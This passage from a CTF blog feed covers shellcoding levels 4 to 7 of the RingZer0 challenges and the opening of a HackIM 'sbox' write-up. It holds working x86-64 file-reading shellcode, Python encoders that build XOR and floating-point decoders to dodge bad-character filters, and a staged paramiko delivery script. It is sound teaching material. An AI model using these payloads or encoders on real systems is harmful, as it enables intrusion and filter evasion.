pop rsi             ; rsi is the buffer to which we read the filename to open

push byte 18        ; the filename will be 18 bytes long
pop rdx             ; amount of byte to read
syscall             ; read in the filename

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 2           ; syscall open. I had to use the xor here to avoid badchars after encoding this shellcode.
push rdi            ; switch around some registers. rdi = 0
push rsi            ; rsi = pointer to filename
pop rdi             ; rdi now points to filename to open
pop rsi             ; rsi = 0, which is O_RDONLY
syscall             ; open file

                    ; switch around the registers again. 
                    ; have to use the push/pops, because `xchg` would generate a badchar after encoding.
push rax            ; filehandle of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 (syscall read)
pop rdi             ; rdi = filehandle
push byte 127       ; amount of bytes to read
pop rdx             ; in rdx
syscall             ; read in the contents of the file

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 1           ; syscall write
push rax            ; copy rax to rdi
pop rdi             ; filehandle = 0 (stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write to stdout; get me the flag!
ret                 ; return to handler program
</code></pre>

<p>Now, I could assemble these two shellcode pieces with <code>nasm</code>:</p>

<pre><code>$ nasm -f bin ./decoder.asm
$ nasm -f bin ./shellcode.asm
</code></pre>

<p>Then I wrote a small python program to do the actual encoding of the shellcode:</p>

<pre><code class="python">payload = ''

# read in the decoder
with open('decoder') as decoder:
    data = decoder.read()
    for i in data:
        payload += "\\x%02x" % ord(i)
    decoder.close()

# read in the shellcode &amp; encode it
with open('shellcode') as sc:
    data = sc.read()
    # for each byte, we add 1 to it and emit it.
    for i in data:
        payload += "\\x%02x" % (ord(i) + 1)
    sc.close()

# spit out payload!
print payload
</code></pre>

<p>After running this python script, I ended up with the completed shellcode:</p>

<pre><code class="python">$ python ./encode.py 
\x4c\x8d\x35\x8b\x56\x34\x12\x49\x81\xee\x78\x56\x34\x12\x6a\x2b\x59\x41\xfe\x0e\x49\x83\xc6\x01\xe2\xf7\x6b\x01\x5c\x54\x59\x54\x60\x55\x5f\x6b\x13\x5b\x10\x06\x54\x59\x35\x03\x58\x57\x60\x5f\x10\x06\x51\x57\x58\x5f\x59\x60\x6b\x80\x5b\x10\x06\x54\x59\x35\x02\x51\x60\x10\x06\xc4
</code></pre>

<p>As you can see, there are no badchars in this shellcode. We can send it over and grab the flag!</p>

<pre><code class="bash">RingZer0 Team CTF Shellcoding Level 4
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x48" max size 80 bytes.
You main goal is to read /flag/level4.flag

shellcode&gt;\x4c\x8d\x35\x8b\x56\x34\x12\x49\x81\xee\x78\x56\x34\x12\x6a\x2b\x59\x41\xfe\x0e\x49\x83\xc6\x01\xe2\xf7\x6b\x01\x5c\x54\x59\x54\x60\x55\x5f\x6b\x13\x5b\x10\x06\x54\x59\x35\x03\x58\x57\x60\x5f\x10\x06\x51\x57\x58\x5f\x59\x60\x6b\x80\x5b\x10\x06\x54\x59\x35\x02\x51\x60\x10\x06\xc4
    Shellcode received...
    Shellcode length (70) bytes.

    Success: Executing shellcode...

/flag/level4.flag^@
FLAG-&lt;redacted&gt;
Connection to shellcode.ringzer0team.com closed.
</code></pre>

<h2>Level 5</h2>

<p>Of course, level 5 increases the bad char list even further&hellip;</p>

<pre><code>Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68" and \x40 to \x65 max size 100 bytes.
</code></pre>

<p>We can no longer use the relative addressing with <code>lea</code>, because of the bad chars <code>0x49</code> and <code>0x48</code>. In fact, I was unable to get the address of the shellcode via any techniques I know.</p>

<p>I assumed that this shellcode is being executed via a instruction like <code>call rax</code>. That means that <code>rax</code> would still contain the pointer to the shellcode. If this is the case, we can re-use the value in <code>rax</code> as an index to the shellcode and use it to carve out the &lsquo;real&rsquo; shellcode via <code>xor</code> instructions. But let&rsquo;s first test this hypothesis. Time to get creative!</p>

<p>I made a small piece of shellcode that tests this hypothesis:</p>

<pre><code>bits 64

default rel

_start:
xor dword [rax+_temp-_start], 0x3d283d28        ; the xor will change the rets to jmp $-2!

nop
nop
nop
nop
nop
nop
nop

_temp:
ret
ret
ret
ret
</code></pre>

<p>When this code executes, the <code>xor</code> instruction should change the <code>ret</code> instructions to <code>jmp $-2</code>, or infinite loops (this works, because <code>c3 c3 c3 c3 xor 28 3d 28 3d</code> translates to <code>eb fe eb fe</code>). If <code>rax</code> does not point to the shellcode, I might get a SIGSEGV or the code simply exits.</p>

<p>Compiling it and sending it over, however, makes the program hang! This must means that the <code>ret</code>s were changed into <code>jmp</code> instructions, proving the hypothesis. We can use <code>rax</code> as a pointer to the shellcode! Now, we need to carve out the actual shellcode and execute it. I chose to use the same <code>xor</code> strategy. I made the <code>read/open/read/write</code> shellcode a lot smaller, managing to bring it down to 31 bytes. It contains bad chars again, but that&rsquo;s okay because I&rsquo;m gonna encode it anyway:</p>

<pre><code>bits 64

_start:

xor rax, rax        ; syscall read
push rax
pop rdi             ; rdi: fd = stdin 
push rsp
pop rsi             ; rsi points to stack, aka a buffer
push byte 127
pop rdx             ; read 127 bytes
syscall

mov al, 2           ; open; because we read less than 128 bytes, the rest of rax/eax/ax/ah will contain zeroes.
xchg rsi, rdi       ; rsi is now zero (O_RDONLY) and rdi points to the filename on the stack
syscall             ; open the file

xchg rax, rdi       ; after this, rax = pointer to the stack, rdi = filehandle
xchg rax, rsi       ; after this, rax = 0, rsi = pointer to the stack
syscall             ; read

mov al, 1           ; again, less than 128 bytes will be read
push rax
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write out contents of flag to stdout!
</code></pre>

<p>Next, I needed to carve out this shellcode using <code>xor</code> instructions. These instructions must not contain bad chars. Luckily, <code>xor dword ptr [rax+offset]</code> itself does not contain bad chars, or they can be avoided.</p>

<pre><code class="python">import struct

''' this function will try to locate a combination of two bytes that, when
    xor'ed, yield the required byte.
'''
def find_xor_bytes(b):
    for i in range(256):
        if i not in badchars:
            if ord(b) ^ i not in badchars:
                # return the two bytes that encode the required byte
                return chr(i), chr(ord(b) ^ i)
    print "cannot find proper byte for {}".format(b)
    exit(-1)

# build the bad char lookup array.
badchars = [0x0, 0xa, 0xd, 0x2f, 0xff, 0xf, 0x5, 0x68]
for i in range(0x40, 0x65):
    badchars.append(i)
# I got a bit paranoid and decided that these bytes were badchars too
for i in range(0x1, 0xf):
    badchars.append(i)

# read in the shellcode that we need to encode.
with open('modified-shellcode3') as sc:
    data = sc.read()
    sc.close()

# pad out the shellcode to a multiple of four
while len(data) % 4:
    data += "\xc3"

# ill-named variables to hold the encrypted bytes
storage = ''
encoded_bytes = ''
commands = ''
defines = ''
num_commands = 0

# iterate over each byte in the shellcode
for b in data:
    # try to find two bytes that are not badchars themselves
    (b1, b2) = find_xor_bytes(b)
    # store those bytes
    storage += b1
    encoded_bytes += b2
    # if there are four bytes stored, add them to the output &amp; start again
    if len(storage) == 4:
        # emit 
        commands += "xor dword [rax+_shellcode{}-_shellcode], {}\n".format(num_commands, hex(struct.unpack('&lt;L', storage)[0]))
        defines += "_shellcode{} dd {}\n".format(num_commands, hex(struct.unpack('&lt;L', encoded_bytes)[0]))
        storage = ''
        encoded_bytes = ''
        num_commands += 1

# output the resulting assembly 
print """bits 64
_start:

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall
;lea rax, [_decoder]

_shellcode:
jmp _decoder
"""
print defines
print "_decoder:"
print commands
print "jmp _shellcode0"
</code></pre>

<p>This output the encoded shellcode as an assembly file. Using <code>nasm</code>, I could build it into shellcode again. For local testing, I included a call to <code>mprotect</code> and set the value of <code>rax</code> to the start of the shellcode, just like the situation on the remote server. The layout of the built shellcode (first encrypted bytes, then the decoder) is done on purpose: it avoids bad chars in the <code>xor dword [rax+offset]</code> instructions. The value for the offset should not be too high, as that would introduce bytes in the range <code>0x40</code> to <code>0x65</code>&hellip;</p>

<pre><code>bits 64
_start:

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall
;lea rax, [_decoder]

_shellcode:
jmp _decoder
_shellcode0 dd 0x70d02169
_shellcode1 dd 0x7a7e747f
_shellcode2 dd 0x151f7a6f
_shellcode3 dd 0x976912a0
_shellcode4 dd 0x69151fe7
_shellcode5 dd 0x1f866987
_shellcode6 dd 0x7011a015
_shellcode7 dd 0xd3151f7f

_decoder:
xor dword [rax+_shellcode0-_shellcode], 0x20101021
xor dword [rax+_shellcode1-_shellcode], 0x10202020
xor dword [rax+_shellcode2-_shellcode], 0x10102010
xor dword [rax+_shellcode3-_shellcode], 0x10211010
xor dword [rax+_shellcode4-_shellcode], 0x21101010
xor dword [rax+_shellcode5-_shellcode], 0x10102110
xor dword [rax+_shellcode6-_shellcode], 0x20101010
xor dword [rax+_shellcode7-_shellcode], 0x10101020

jmp _shellcode0
</code></pre>

<p>Feeling quite chuffed, I assembled it and checked for bad chars&hellip; there was one! A <code>0x0a</code> byte snuck in. This was because the addresses of the encoded dwords were, relative to <code>rax</code>: 2, 6, 10, 14, etc. I needed to add an offset, which I did:</p>

<pre><code>_shellcode:
jmp _decoder
nop
nop
</code></pre>

<p>This took care of the problem. Yes, this shellcode could have been shorter, probably. A lot of the constants look similar, so I could have probably made the decoder smaller by selecting a &lsquo;magic&rsquo; constant. However, it worked!</p>

<pre><code class="bash">$ echo; nasm -f bin ./completed2.asm; xxd -c 1 ./completed2 | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./completed2

\xeb\x22\x90\x90\x69\x21\xd0\x70\x7f\x74\x7e\x7a\x6f\x7a\x1f\x15\xa0\x12\x69\x97\xe7\x1f\x15\x69\x87\x69\x86\x1f\x15\xa0\x11\x70\x7f\x1f\x15\xd3\x81\x70\x04\x21\x10\x10\x20\x81\x70\x08\x20\x20\x20\x10\x81\x70\x0c\x10\x20\x10\x10\x81\x70\x10\x10\x10\x21\x10\x81\x70\x14\x10\x10\x10\x21\x81\x70\x18\x10\x21\x10\x10\x81\x70\x1c\x10\x10\x10\x20\x81\x70\x20\x20\x10\x10\x10\xeb\xa6
94 ./completed2

$ ssh level5@shellcode.ringzer0team.com -p 7771level5@shellcode.ringzer0team.com's password: 
Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
Last login: Thu Feb  5 17:23:29 2015 from 137.224.219.201

RingZer0 Team CTF Shellcoding Level 5
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x65" max size 100 bytes.
You main goal is to read /flag/level5.flag

shellcode&gt;\xeb\x22\x90\x90\x69\x21\xd0\x70\x7f\x74\x7e\x7a\x6f\x7a\x1f\x15\xa0\x12\x69\x97\xe7\x1f\x15\x69\x87\x69\x86\x1f\x15\xa0\x11\x70\x7f\x1f\x15\xd3\x81\x70\x04\x21\x10\x10\x20\x81\x70\x08\x20\x20\x20\x10\x81\x70\x0c\x10\x20\x10\x10\x81\x70\x10\x10\x10\x21\x10\x81\x70\x14\x10\x10\x10\x21\x81\x70\x18\x10\x21\x10\x10\x81\x70\x1c\x10\x10\x10\x20\x81\x70\x20\x20\x10\x10\x10\xeb\xa6
    Shellcode received...
    Shellcode length (94) bytes.

    Success: Executing shellcode...

/flag/level5.flag^@
FLAG-&lt;redacted&gt;
    Error: SIGSEGV received I think your shellcode is not working.
</code></pre>

<h2>Level 6</h2>

<pre><code>Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x81" max size 90 bytes.
</code></pre>

<p>Things are beginning to look grim! Every time I came up with a solution, the next level would list one or more crucial bytes as a bad char. This time, <code>0x81</code> became a bad char, blocking the use of the <code>xor</code>.</p>

<p>I turned again to the gigantic table over at <a href="http://ref.x86asm.net/coder64.html">ref.x64asm.net</a>. I flipped through the list of available opcodes, looking for things that would allow me to decode and carve out the shellcode. Finally, my eyes caught the floating point instructions. One of the variants allows the use of integers as arguments for floating point operations:</p>

<pre><code>fild dword [rax+rbx*4]
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
</code></pre>

<p>These instructions do not contain bad chars! Furthermore, they allow the use of <code>rax</code> as a pointer to the shellcode, enabling us to carve out stage 1. I used a similar trick as in level 5 to check the viability of this technique:</p>

<pre><code>bits 64

_start:
jmp _decode
nop
nop                     ; align the encoded shellcode to a dword boundary

_stage1:

_0 dd 0xc3c3c3c3        ; these rets should be transformed into jmp $-2
_1 dd 0x90909090
_2 dd 0x90909090
_3 dd 0x90909090
_4 dd 0x90909090
_5 dd 0x90909090
_6 dd 0x90909090

_8 dd 0x3b283b28        ; funny enough, the constant for the add is the same as for the xor!
_9 dd 0x90909090
_a dd 0x90909090
_b dd 0x90909090
_c dd 0x90909090
_d dd 0x90909090
_e dd 0x90909090

_decode:                ; i'd call this stage 0
xor ecx,ecx             ; clear ecx and rcx
xor ebx,ebx             ; clear ebx
mov cl, (_6-_start)/4   ; starting dword for shellcode 
mov bl, (_e-_start)/4   ; starting dword for decoding constants
_decodeloop:
fild dword [rax+rbx*4]  ; load integer into st0
dec bl
fiadd dword [rax+rcx*4] ; add constant to st0
fistp dword [rax+rcx*4] ; store integer at this position, effectively decoding the instructions
loop _decodeloop        ; use the fact that rcx is now an index and a counter

jmp _stage1             ; jump to -hopefully- decoded shellcode
</code></pre>

<p>Again, this hangs the remote program, confirming that this is a viable technique. I adjusted <code>encode.py</code> to generate the right constants. Prepare for some ultra-hacky python:</p>

<pre><code class="python">import struct

carry = 0
def find_sub_bytes(byte_required):
    global carry
    b = ord(byte_required) - carry  # compensate for possible carry from previously encoded byte
    for i in range(256):
        if i not in badchars:
            c = b - i
            if (c &amp; 0xff) not in badchars:
                carry = 0
                if c &lt; 0:
                    carry = 1   # this carry is necessary, because the if the byte overflows, it is carried over to the next byte. 
                # return the two bytes that encode the required byte
                return chr(i), chr(c &amp; 0xff)
    print "cannot find proper byte for {}".format(b)
    exit(-1)

badchars = [0x0, 0xa, 0xd, 0x2f, 0xff, 0xf, 0x5, 0x68]
for i in range(0x40, 0x82):
    badchars.append(i)
# paranoia!
for i in range(0x1, 0xf):
    badchars.append(i)

with open('shellcode') as sc:
    data = sc.read()
    sc.close()

storage = ''
encoded_bytes = ''
commands = ''
defines = ''
num_commands = 0

while len(data) % 4:
    data += "\x8f"

for b in data:
    (b1, b2) = find_sub_bytes(b)

    storage += b1
    encoded_bytes += b2
    if len(storage) == 4:
        # emit
        carry = 0   # clear carry, not necessary for next dword!
        commands += "_a{} dd {}\n".format(num_commands, hex(struct.unpack('&lt;L', storage)[0]))
        defines += "_b{} dd {}\n".format(num_commands, hex(struct.unpack('&lt;L', encoded_bytes)[0]))
        storage = ''
        encoded_bytes = ''
        num_commands += 1

print """default rel
bits 64

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall

;lea rax, [_start]

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _decoder
"""
print commands
print defines
print """
_decoder:
xor ebx,ebx
mov cl, (_a{}-_start)/4
mov bl, (_b{}-_start)/4
_decodeloop:
fild dword [rax+rbx*4]
dec bl
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
loop _decodeloop
jmp _a0

""".format(num_commands-1, num_commands-1)
</code></pre>

<p>This generated the following assembly:</p>

<pre><code>bits 64

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _decoder

_a0 dd 0x11101010
_a1 dd 0x2b1f1520
_a2 dd 0x10111a82
_a3 dd 0x89101010
_a4 dd 0x10101110
_a5 dd 0x11101010
_a6 dd 0x10101010
_a7 dd 0x10101120

_b0 dd 0x3fb02138
_b1 dd 0x3f3f3f3f
_b2 dd 0xf4fe3ffd
_b3 dd 0xfe37f2a0
_b4 dd 0x37f4fee7
_b5 dd 0xfe863887
_b6 dd 0x3ff19ff5
_b7 dd 0xb2f4fe3f


_decoder:
xor ebx,ebx
mov cl, (_a7-_start)/4
mov bl, (_b7-_start)/4
_decodeloop:
fild dword [rax+rbx*4]
dec bl
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
loop _decodeloop
jmp _a0
</code></pre>

<p>There was, however, a huge problem. The instruction <code>jmp _decoder</code> generated a bad char: <code>0x40</code>. This is because it has to jump over two times 32 bytes of data to reach the decoder, which is exactly 64 bytes. However, the shellcode is only 31 bytes long, while I store 32 bytes. That means that the last byte is redundant! I exploited this fact by making this final byte a NOP. But because it is used in the decoding process, I had to modify <code>encode.py</code> again.</p>

<pre><code class="python">while len(data) % 4:
    #data += "\xc3"
    data += "\x8f"  # found by trial &amp; error ;)
</code></pre>

<p>This modifies the two last constants:</p>

<pre><code>_a7 dd 0x90101120
...
_b7 dd 0xfef4fe3f
</code></pre>

<p>I switched them around, so that the last byte of _b7 would be the 0x90 byte. Then, I could jump there:</p>

<pre><code>jmp _b7+3           ; assembles to eb 3f -&gt; no more badchars!

...
_a7 dd 0xfef4fe3f
...
_b7 dd 0x90101120   ; this was 0xfef4fe3f (little endianess)
</code></pre>

<p>The working shellcode now looks like this:</p>

<pre><code>bits 64

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _b7+3               ; jump to the NOP, avoiding a bad char.

_a0 dd 0x11101010
_a1 dd 0x2b1f1520
_a2 dd 0x10111a82
_a3 dd 0x89101010
_a4 dd 0x10101110
_a5 dd 0x11101010
_a6 dd 0x10101010
_a7 dd 0xfef4fe3f

_b0 dd 0x3fb02138
_b1 dd 0x3f3f3f3f
_b2 dd 0xf4fe3ffd
_b3 dd 0xfe37f2a0
_b4 dd 0x37f4fee7
_b5 dd 0xfe863887
_b6 dd 0x3ff19ff5
_b7 dd 0x90101120

_decoder:
xor ebx,ebx

mov cl, (_a7-_start)/4
mov bl, (_b7-_start)/4
_decodeloop:    
fild dword [rax+rbx*4]  ; load integer
dec bl
fiadd dword [rax+rcx*4] ; do the actual decoding
fistp dword [rax+rcx*4] ; store the decoded bytes
loop _decodeloop        ; use rcx as counter and index
jmp _a0                 ; jump to decoded shellcode
</code></pre>

<p>Let&rsquo;s run it!</p>

<pre><code>shellcode&gt;\x31\xc9\xeb\x3f\x10\x10\x10\x11\x20\x15\x1f\x2b\x82\x1a\x11\x10\x10\x10\x10\x89\x10\x11\x10\x10\x10\x10\x10\x11\x10\x10\x10\x10\x3f\xfe\xf4\xfe\x38\x21\xb0\x3f\x3f\x3f\x3f\x3f\xfd\x3f\xfe\xf4\xa0\xf2\x37\xfe\xe7\xfe\xf4\x37\x87\x38\x86\xfe\xf5\x9f\xf1\x3f\x20\x11\x10\x90\x31\xdb\xb1\x08\xb3\x10\xdb\x04\x98\xfe\xcb\xda\x04\x88\xdb\x1c\x88\xe2\xf3\xeb\xab
    Shellcode received...
    Shellcode length (89) bytes.

    Success: Executing shellcode...

/flag/level6.flag^@
FLAG-&lt;redacted&gt;
Connection to shellcode.ringzer0team.com closed.
</code></pre>

<p>Got it with <em>one</em> byte to spare!</p>

<h2>Level 7: Ultra-Violence</h2>

<p>OK, I thought the last level was pretty hard, having to resort to floating point instructions to carve out a shellcode. I was shocked to see the description for level 7:</p>

<pre><code>This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x30 to \x81" max size 40 bytes.
For an unknown funky reason I decide to add couple of random bytes in your buffer after the twentieth character.
Random chunk of bytes size is based on "rand() % 20"
</code></pre>

<p>Waaaaat. A shit-ton of bad chars, plus it seems I couldn&rsquo;t trust whatever I sent after the twentieth bytes. This effectively cut my shellcode size to <em>just twenty bytes</em>. I could never send in a stage0 that would carve out the real shellcode, as there was simply not enough space. Instead, my stage 0 would have to read in the shellcode from the socket directly. So, I needed a way to call <code>syscall</code> to read from stdin. However, <code>0x0f</code> and <code>0x05</code> are badchars. Furthermore, where exactly would I store this newly read shellcode?</p>

<p>Here&rsquo;s what I came up with. I&rsquo;ll dump out stage 0 and explain it, going bit by bit (just as I did when making this monstrosity). This assembles to <em>exactly</em> 20 bytes:</p>

<pre><code>bits 64
_start:                 
add al, _syscall-_start
fldz                    
fsub dword [rax]        
fistp dword [rax]       
sbb esi, esi            
xchg esi, edi           
sbb esi, esi            
mov dl, 0xf0            
_syscall:
dd -84907592.0          
</code></pre>

<p>First things first, we need some way to decode an encoded version of <code>syscall</code>. Again, I turned to floating point instructions. I could a zero and then subtract another float; I might be able to get the resulting integer to decode to <code>syscall</code>!</p>

<p>Due to the size limitation, I could only encode four bytes. The rest of the shellcode would not only need to take care of decoding these four bytes, but also setting up the registers for <code>syscall read</code>.</p>

<pre><code>bits 64
_start:                 ; shellcode stage0: read in stage1
add al, _syscall-_start ; point rax to encoded instruction
</code></pre>

<p>I didn&rsquo;t care anymore about using <code>rcx</code> as a counter and index. I needed to adjust the pointer to the right address, which contained an encoded dword. The decoding of this dword is handle by these instructions:</p>

<pre><code>fldz                    ; setup st0
fsub dword [rax]        ; subtract encoded instruction
fistp dword [rax]       ; store them again
</code></pre>

<p>The dword that I chose to encode were actually these instructions:</p>

<pre><code>bits 64
xchg rax,rsi
syscall
</code></pre>

<p>These would assembled to:</p>

<pre><code>$ xxd small
0000000: 4896 0f05
</code></pre>

<p>I then turned to python:</p>

<pre><code class="python">$ python
Python 2.7.3 (default, Mar 13 2014, 11:03:55) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; 0x050f9648
84907592
</code></pre>

<p>I was lucked out here. I tried many things, but this value, stored as a negative float, did <strong>not</strong> contain any bad chars!</p>

<pre><code>sbb esi, esi            ; set rsi to zero
xchg esi, edi           ; used for edi -&gt; stdin
sbb esi, esi            ; set rsi to zero, used for rax -&gt; read
mov dl, 0xf0            ; read in 0xf0 bytes, hopefully enough
_syscall:
dd -84907592.0          ; this is actually xchg rax, rsi; syscall but encoded as a float!
</code></pre>

<p>The <code>sbb</code> instruction is just another way of saying <code>sub esi, esi</code>. The <code>sub</code> instruction contains a bad char. Operations on <code>rsi</code> and <code>rdi</code> contained bad chars, but using <code>esi</code> and <code>edi</code> still had the desired effect of zeroing out the registers.</p>

<p>Finally, just before the <code>syscall</code> would be executed, the registers look like this:</p>

<pre><code>rsi: address of _syscall
rdi: zero (stdin)
rax: zero (syscall read)
</code></pre>

<p>Upon executing the syscall, code execution will go into kernel space, reading from stdin <em>to</em> the address of _syscall, overwriting the instructions that come after it.</p>

<p>Which lead me to another problem: how do we send the shellcode? I couldn&rsquo;t send raw bytes over <code>ssh</code>. One option was to encode the shellcode again, using an alphanumeric carver. I decided to put that option on hold. I tried to port-forward the ssh connection so that I could use python and sockets to get the flag; didn&rsquo;t work. Instead, I had to turn to some paramiko black magic. Behold, <code>fullauto.py</code>!</p>

<pre><code class="python">import paramiko
import time

ssh = paramiko.SSHClient()
# fix missing hostkey -&gt; https://stackoverflow.com/questions/10670217/paramiko-unknown-server
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())   
ssh.connect('shellcode.ringzer0team.com', username='level7', password='FLAG-&lt;redacted&gt;', port=7771)

# this was the only thing that worked for me. opening a channel via a transport failed miserably.
chan = ssh.invoke_shell()
time.sleep(0.2)

print chan.recv(1024)
time.sleep(0.2)

# send stage0, which will attempt to read from stdin. mind the last \n!
chan.send("\\x04\\x10\\xd9\\xee\\xd8\\x20\\xdb\\x18\\x19\\xf6\\x87\\xf7\\x19\\xf6\\xb2\\xf0\\xc9\\xf2\\xa1\\xcc\n")
time.sleep(0.2)

print chan.recv(256)
time.sleep(0.2)

# we'll need a small NOP sled to get us to the shellcode
payload = "\x90" * 20

# read in the 31 byte shellcode, designed to open/read/write a file
with open('modified-shellcode3') as f:
    data = f.read()
    payload += data
    f.close()

chan.send(payload+'\n')
time.sleep(0.2)

chan.send('/flag/level7.flag\x00\n')
print chan.recv(256)
time.sleep(0.2)

# receive flag!
print chan.recv(256)
</code></pre>

<p>Running this python script with the appropriate password to level 7 spat out, amongst others, <em>part</em> of the final flag!</p>

<p>Something funky was going on. The stage 2 was being read and executed, but the contents of the flag on the stack were being mangled.</p>

<p>I finally traced it to this part of the shellcode:</p>

<pre><code>lea rsi, [rsp]

...

mov al, 1
push rax            ; the push seems to mangle the output on the stack
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall
ret
</code></pre>

<p>Substituting it for this seemed to do the trick:</p>

<pre><code>lea rsi, [rsp+60]

...

mov rdx, rax        ; number of bytes read; output exactly the contents of flag. it's cleaner this way
mov al, 1
push rax            ; the push seems to mangle the output on the stack
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall
ret
</code></pre>

<p>I&rsquo;m still puzzled why this originally mangled the output on the stack, where I had no problems with this shellcode before. If anyone has an idea, let me know in the comments :)</p>

<h2>Final words</h2>

<p>Phew, what a ride! These challenges were a lot of fun and taught me several interesting concepts about x86-64 shellcoding. Thank you <a href="http://ringzer0team.com/">RingZer0Team</a> for these awesome challenges!</p>

<p>This writeup was written in two evenings of rigorously hacking away at the keyboard (the challenges were solved over several days). Therefore, errors will probably exist. If you find any, or have any suggestion or useful remark, please feel free to leave them in the comments!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Sbox]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/"/>
    <updated>2015-01-11T22:52:27+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox</id>
    <content type="html"><![CDATA[<p>Quirky little challenge, this <code>sbox</code>. We&rsquo;re actually given the keys to the kingdom right away!</p>

<!-- more -->


<p>Again, this was a one-two with superkojiman, who did the initial reversing! The program needs <code>libseccomp</code> to run. I had to install <code>libseccomp1</code> on my Ubuntu VM and symlink <code>libseccomp.so.2</code> to it to make the binary start. <a href="http://sourceforge.net/projects/libseccomp/">libseccomp</a> does syscall filtering. In this case, whatever is added to its internal list is ok, other syscalls are caught and the program exits with SIGSYS.</p>

<p>The syscalls that are whitelisted can be found by looking for <code>seccomp_rule_add</code> calls:</p>

<pre><code> 80488dc: c7 44 24 0c 00 00 00  mov    DWORD PTR [esp+0xc],0x0
 80488e3:   00 
 80488e4:   c7 44 24 08 03 00 00    mov    DWORD PTR [esp+0x8],0x3  ; syscall read
 80488eb:   00 
 80488ec:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 80488f3:   7f 
 80488f4:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 80488f8:   89 04 24                mov    DWORD PTR [esp],eax
 80488fb:   e8 b0 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
 8048900:   89 44 24 38             mov    DWORD PTR [esp+0x38],eax
 8048904:   83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
 8048909:   79 05                   jns    8048910 &lt;main+0x191&gt;
 804890b:   e9 d9 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
 8048910:   c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
 8048917:   00 
 8048918:   c7 44 24 08 04 00 00    mov    DWORD PTR [esp+0x8],0x4  ; syscall write
 804891f:   00 
 8048920:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 8048927:   7f 
 8048928:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 804892c:   89 04 24                mov    DWORD PTR [esp],eax
 804892f:   e8 7c fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
 8048934:   89 44 24 38             mov    DWORD PTR [esp+0x38],eax
 8048938:   83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
 804893d:   79 05                   jns    8048944 &lt;main+0x1c5&gt;
 804893f:   e9 a5 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
 8048944:   c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
 804894b:   00 
 804894c:   c7 44 24 08 01 00 00    mov    DWORD PTR [esp+0x8],0x1  ; syscall exit
 8048953:   00 
 8048954:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 804895b:   7f 
 804895c:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 8048960:   89 04 24                mov    DWORD PTR [esp],eax
 8048963:   e8 48 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
</code></pre>

<p>So that&rsquo;s not a whole lot to work with. We can only read, write and exit. No <code>execve</code> or open/read/write for us!</p>

<h2>Diving deeper</h2>

<p>Luckily, when run, the binary does all the heavy lifting for us. It reads the flag and stores it on the heap. It then waits for input, storing that also on the heap and then proceeds to run whatever is entered:</p>

<pre><code>   0x80489d6 &lt;main+599&gt;:    call   0x80485a0 &lt;read@plt&gt;
   0x80489db &lt;main+604&gt;:    mov    eax,DWORD PTR [esp+0x2c]
   0x80489df &lt;main+608&gt;:    mov    DWORD PTR [esp+0x3c],eax
   0x80489e3 &lt;main+612&gt;:    mov    eax,DWORD PTR [esp+0x3c]
   0x80489e7 &lt;main+616&gt;:    call   eax
</code></pre>

<p>This allows us to supply our own shellcode without even having to exploit a vulnerability. There were some annoying things that prevented me from debugging the binary locally, so I hex-edited the binary to make the calls to <code>signal()</code> and <code>alarm()</code> do nothing (edit the <code>plt</code> section for those calls &amp; make the first byte <code>0xc3</code> -> <code>RET</code>).</p>

